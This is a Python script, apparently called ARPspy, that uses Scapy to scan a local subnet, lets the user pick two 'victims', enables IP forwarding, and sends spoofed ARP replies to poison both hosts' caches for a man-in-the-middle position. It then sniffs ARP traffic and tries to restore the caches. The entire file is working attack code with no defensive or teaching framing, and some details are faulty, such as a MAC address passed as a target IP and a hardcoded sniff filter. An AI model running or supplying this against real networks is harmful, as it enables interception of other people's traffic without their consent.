import logging
import subprocess
import time
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, sr1, sniff, send

live_hosts=[]

### ARP poisoning ###
def arp_poison(victim_0_ip, victim_0_mac, victim_1_ip, victim_1_mac):
    ARP_packet_1 = ARP(op=2, pdst=victim_0_ip, hwdst=victim_0_mac, psrc=victim_1_ip)
    ARP_packet_2 = ARP(op=2, pdst=victim_1_ip, hwdst=victim_1_mac, psrc=victim_0_ip)
    send(ARP_packet_1, count=2)
    send(ARP_packet_2, count=2)
    time.sleep(2)
### end ARP poisoning ###

### Attack recovery ###
def cancel_attack(victim_0_ip, victim_0_mac, victim_1_ip, victim_1_mac):
    ARP_packet_1 = ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_0_ip, hwsrc=victim_1_mac, psrc=victim_1_ip)
    ARP_packet_2 = ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_1_mac, hwsrc=victim_0_mac, psrc=victim_0_ip)
    send(ARP_packet_1, count=5)
    send(ARP_packet_2, count=5)
### end attack recovery ###

### ARP sniffer ###
def arp_display(pkt):
    if(pkt[ARP].op==1):
        return ("Request: {0} is asking about {1}").format(pkt[ARP].psrc, pkt[ARP].pdst)
    if(pkt[ARP].op==2):
        return("Response: {0} has address{1}").format(pkt[ARP].hwsrc, pkt[ARP].psrc)
### end APR sniffer ###

### scan network ###
def scan_network(interface):
    ip = subprocess.check_output("ifconfig "+interface+"| grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1", shell="True", universal_newlines="True" ).strip()
    dir = ip.split(".")
    prefix = dir[0]+"."+dir[1]+"."+dir[2]+"."
    # enum list is the list number (i.e --> 1.)
    enum_list=1;
    for addr in range(1,5):
        answer = sr1(ARP(pdst=prefix+str(addr)), timeout=1, verbose=0)
        if (answer != None):
            print("{0}. {1} - {2}".format(enum_list,prefix+str(addr),answer.hwsrc))
            live_hosts.append((prefix+str(addr),answer.hwsrc))
            enum_list=enum_list+1;
### end scan network ###

## Main program ##
print("\n*************************\n*** Welcome to ARPspy ***\n*************************\n")
if len(sys.argv)!=2:
    print("Usage - ./scapyScript.py [interface]")
    print("Example - ./scapyScript.py eth0")
    sys.exit()

interface = str(sys.argv[1])
scan_network(interface)

victim0=input("\n>>> Choose victim [0]: ")
v0_ip = live_hosts[int(victim0)-1][0]
v0_mac = live_hosts[int(victim0)-1][1]

victim1 = input("\n>>> Choose victim [1]: ")
v1_ip = live_hosts[int(victim1)-1][0]
v1_mac = live_hosts[int(victim1)-1][1]

#Enable IP forwarding
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
arp_poison(v0_ip, v0_mac, v1_ip, v1_mac)
sniff(prn=arp_display, filter="arp and host 192.168.1.3", store=0, count=5)
cancel_attack(v0_ip, v0_mac, v1_ip, v1_mac)
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL)
## End main program ##
